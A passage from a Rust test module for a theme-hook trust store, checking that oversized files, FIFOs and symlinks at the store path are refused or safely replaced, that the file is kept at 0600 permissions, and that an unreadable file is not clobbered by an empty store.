        let padding = "a".repeat(crate::theme_package::MAX_THEME_FILE_BYTES as usize + 1024);
        let raw = format!(
            "version = 1\njunk = \"{padding}\"\n\n[accepted.Risky]\nhooks = [{{ provider = \"noctalia-v5\", key = \"started\", command = \"sddm-watch.sh\" }}]\npresets = []\n"
        );
        std::fs::write(&path, &raw).unwrap();

        // The fixture must be a store the parser WOULD accept — otherwise
        // this test would pass for the wrong reason (a syntax error is
        // refused too, and then the bound is not what was proven).
        let parsed: StoreFile = toml::from_str(&raw).expect("the fixture must be a valid store");
        assert_eq!(parsed.version, STORE_VERSION);
        assert_eq!(
            parsed.accepted.len(),
            1,
            "the fixture must carry the acceptance"
        );

        assert!(
            !TrustStore::load(&path).accepts("Risky", &risky_report()),
            "an over-bound store must be refused, not read"
        );
    }

    /// A FIFO planted at the store path must be REFUSED, never opened: this
    /// read happens on the apply path, so a blocking open would hang the
    /// apply for ever. The read runs on a worker thread and a timeout proves
    /// it came back. (The same class the W10b verification refuted.)
    #[test]
    fn a_fifo_store_is_refused_instead_of_hanging() {
        use std::os::unix::ffi::OsStrExt;
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        let c = std::ffi::CString::new(path.as_os_str().as_bytes()).unwrap();
        let rc = unsafe { libc::mkfifo(c.as_ptr(), 0o600) };
        assert_eq!(rc, 0, "mkfifo must succeed for the sandbox fixture");

        let (tx, rx) = std::sync::mpsc::channel();
        let moved = path.clone();
        std::thread::spawn(move || {
            let _ = tx.send(TrustStore::load(&moved).accepts("Risky", &risky_report()));
        });
        match rx.recv_timeout(std::time::Duration::from_secs(3)) {
            Ok(accepted) => assert!(!accepted, "a FIFO store must never answer 'accepted'"),
            Err(_) => panic!("the store read blocked on a FIFO instead of refusing it"),
        }
    }

    // ── the file's own permissions and its write (S6) ────────────────

    /// W2c spec S6: the store is written 0600, and a file inherited from
    /// before this change is tightened on the next write — the same rule W8
    /// set for the logs.
    #[test]
    fn the_store_is_created_0600_and_an_inherited_file_is_tightened() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        let mut store = TrustStore::default();
        store.remember("Risky", &risky_report());
        store.save(&path).unwrap();
        assert_eq!(
            std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
            0o600,
            "a fresh store must be private"
        );

        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
        store.save(&path).unwrap();
        assert_eq!(
            std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
            0o600,
            "a store inherited world-readable must be tightened on the next write"
        );
    }

    /// W2c spec S6: the write is atomic through a private temporary file, so
    /// a pre-existing SYMLINK at the store path is REPLACED. `fs::write`
    /// would follow the link and write through it — the write-side twin of
    /// the residual this contract already recorded for the packaging path.
    #[test]
    fn a_symlink_at_the_store_path_is_replaced_not_written_through() {
        let tmp = tempfile::tempdir().unwrap();
        let victim = tmp.path().join("victim.txt");
        std::fs::write(&victim, "untouched").unwrap();
        let path = tmp.path().join(STORE_FILE);
        std::os::unix::fs::symlink(&victim, &path).unwrap();

        let mut store = TrustStore::default();
        store.remember("Risky", &risky_report());
        store.save(&path).unwrap();

        assert_eq!(
            std::fs::read_to_string(&victim).unwrap(),
            "untouched",
            "the store must never write through a symlink at its own path"
        );
        assert!(
            !std::fs::symlink_metadata(&path)
                .unwrap()
                .file_type()
                .is_symlink(),
            "the store must replace the link with a regular file"
        );
        assert!(TrustStore::load(&path).accepts("Risky", &risky_report()));
        assert_eq!(
            std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
            0o600
        );
    }

    /// The decision recorded in the contract: an empty store is never
    /// written, so a file this process could not read is not clobbered with
    /// nothing. The keeper's next acceptance replaces it, and the loss is
    /// bounded to re-warnings.
    #[test]
    fn an_empty_store_is_never_written_over_a_file_it_could_not_read() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        std::fs::write(&path, "this is not a store {{{").unwrap();

        let store = TrustStore::load(&path);
        store.save(&path).unwrap();
        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "this is not a store {{{",
            "an empty store must leave the file it could not read alone"
        );
    }
}
